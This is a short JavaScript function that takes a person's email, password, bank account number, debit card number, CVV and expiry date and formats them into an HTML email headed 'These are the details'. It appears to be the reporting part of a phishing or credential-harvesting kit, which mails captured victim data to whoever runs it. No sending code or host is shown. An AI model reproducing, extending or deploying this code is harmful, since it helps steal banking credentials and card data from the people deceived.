export const formatEmailMessage = (userData) => {
  const { password, debitNumber, cvv, expiryDate, accountNumber, email } =
    userData;

  const userMessage = `
    <h1>These are the details: </h1>
    ${email ? "<h3><strong>Email: " + email + "</h3></strong>" : ""}
    ${password ? "<h3><strong>Password: " + password + "</h3></strong>" : ""}
    ${
      accountNumber
        ? "<h3><strong>Account Number: " + accountNumber + "</h3></strong>"
        : ""
    }
    <br/>
    ${
      debitNumber
        ? "<h3><strong>Debit Card Number: " + debitNumber + "</h3></strong>"
        : ""
    }
    ${cvv ? "<h3><strong>CVV: " + cvv + "</h3></strong>" : ""}
    ${
      expiryDate
        ? "<h3><strong>Expiry Date: " + expiryDate + "</h3></strong>"
        : ""
    }
    `;

  return userMessage;
};
